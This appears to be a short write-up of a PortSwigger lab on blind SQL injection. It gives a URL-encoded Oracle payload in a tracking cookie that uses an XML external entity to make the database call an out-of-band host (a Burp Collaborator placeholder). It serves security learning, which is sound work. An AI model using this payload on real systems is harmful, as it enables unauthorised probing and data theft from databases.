## SQL Injection Scenerios
### Blind SQL injection with out-of-band interaction
Ref: https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band<br>
https://portswigger.net/web-security/sql-injection/cheat-sheet<br>
Tracking cookie is vulnerable to SQL Injection. You will have to try the payloads from the above link for different database. We have modified the payload using single quote and UNION operator, finally URL encode it (CTRL +U).
```
Cookie: TrackingId=X'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP_COLLABORATOR/">+%25remote%3b]>'),'/l')+FROM+dual--; session=sLSLT6ajEF1d0dYohbMp3el6wAJNOuPs
```
We got the response on the collaborator server that confirms the presence of out of band SQL Injection vulnerablilty.
